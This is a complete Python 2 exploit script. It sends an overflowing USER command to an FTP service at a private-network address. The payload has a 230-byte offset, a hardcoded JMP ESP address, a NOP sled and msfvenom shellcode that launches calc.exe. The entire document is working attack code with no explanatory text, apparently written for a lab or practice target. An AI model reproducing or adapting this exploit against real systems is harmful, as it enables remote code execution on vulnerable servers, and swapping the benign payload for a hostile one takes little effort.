#!/usr/bin/python2

import socket
import sys

host = "192.168.67.137"
port = 21

# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0a\x0d" -f c 

shellcode = (
"\xb8\xe3\xc0\x42\x37\xdd\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x31\x31\x45\x13\x03\x45\x13\x83\xed\x1f\x22\xb7\xcb\x37\x21"
"\x38\x34\xc7\x46\xb0\xd1\xf6\x46\xa6\x92\xa8\x76\xac\xf7\x44"
"\xfc\xe0\xe3\xdf\x70\x2d\x03\x68\x3e\x0b\x2a\x69\x13\x6f\x2d"
"\xe9\x6e\xbc\x8d\xd0\xa0\xb1\xcc\x15\xdc\x38\x9c\xce\xaa\xef"
"\x31\x7b\xe6\x33\xb9\x37\xe6\x33\x5e\x8f\x09\x15\xf1\x84\x53"
"\xb5\xf3\x49\xe8\xfc\xeb\x8e\xd5\xb7\x80\x64\xa1\x49\x41\xb5"
"\x4a\xe5\xac\x7a\xb9\xf7\xe9\xbc\x22\x82\x03\xbf\xdf\x95\xd7"
"\xc2\x3b\x13\xcc\x64\xcf\x83\x28\x95\x1c\x55\xba\x99\xe9\x11"
"\xe4\xbd\xec\xf6\x9e\xb9\x65\xf9\x70\x48\x3d\xde\x54\x11\xe5"
"\x7f\xcc\xff\x48\x7f\x0e\xa0\x35\x25\x44\x4c\x21\x54\x07\x1a"
"\xb4\xea\x3d\x68\xb6\xf4\x3d\xdc\xdf\xc5\xb6\xb3\x98\xd9\x1c"
"\xf0\x57\x90\x3d\x50\xf0\x7d\xd4\xe1\x9d\x7d\x02\x25\x98\xfd"
"\xa7\xd5\x5f\x1d\xc2\xd0\x24\x99\x3e\xa8\x35\x4c\x41\x1f\x35"
"\x45\x22\xfe\xa5\x05\x8b\x65\x4e\xaf\xd3"
)

payload = "A" * 230 # OFFSET
payload += "\xfb\x41\xbd\x7c" # JMP ESP
payload += "\x90" *16 # NOPS SLED
payload += shellcode 

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	print("[+] Sending Payloads")
	s.send("USER " + payload + "\r\n")
	print("[+] Done")
except:
	print("Host is Unreachable")
	sys.exit()
